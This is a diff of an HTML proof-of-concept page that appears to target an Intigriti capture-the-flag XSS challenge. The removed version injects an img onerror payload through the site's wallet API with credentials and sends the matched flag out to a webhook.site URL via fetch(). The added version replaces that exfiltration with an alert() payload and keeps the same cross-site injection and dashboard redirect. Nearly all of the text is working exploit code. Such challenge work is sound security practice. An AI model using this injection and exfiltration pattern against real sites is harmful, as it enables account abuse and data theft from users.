@@ -2,31 +2,33 @@
 <html>
 <head><title>PoC</title></head>
 <body>
-<h1>XSS PoC</h1>
+<h1>XSS PoC - alert("gigawatz")</h1>
 <script>
-async function pwn() {
-  // XSS payload to exfiltrate flag from page
-  const xss = `<img src=x onerror="
-    const flag = document.body.innerHTML.match(/INTIGRITI{[^}]+}/);
-    if (flag) fetch('https://webhook.site/8213b378-934a-402b-8f55-fc2bac82c32d/?f='+flag[0]);
-  ">`;
+async function exploit() {
+  const BASE = 'https://challenge-0126.intigriti.io';
 
-  // Inject XSS via wallet API
-  await fetch('https://challenge-0126.intigriti.io/api/wallets', {
+  // XSS payload that triggers alert("gigawatz")
+  const payload = '<img src=x onerror=alert("gigawatz")>';
+
+  // Inject via wallet API
+  const res = await fetch(`${BASE}/api/wallets`, {
     method: 'POST',
     credentials: 'include',
     headers: {'Content-Type': 'application/json'},
     body: JSON.stringify({
-      currency: '1337COIN',
-      address: xss,
+      currency: 'BTC',
+      address: payload,
       balance: 1
     })
   });
 
+  console.log('Wallet status:', res.status);
+
   // Navigate to dashboard to trigger XSS
-  window.location = 'https://challenge-0126.intigriti.io/dashboard.html';
+  window.location = `${BASE}/dashboard.html`;
 }
-pwn();
+
+exploit();
 </script>
 </body>
 </html>
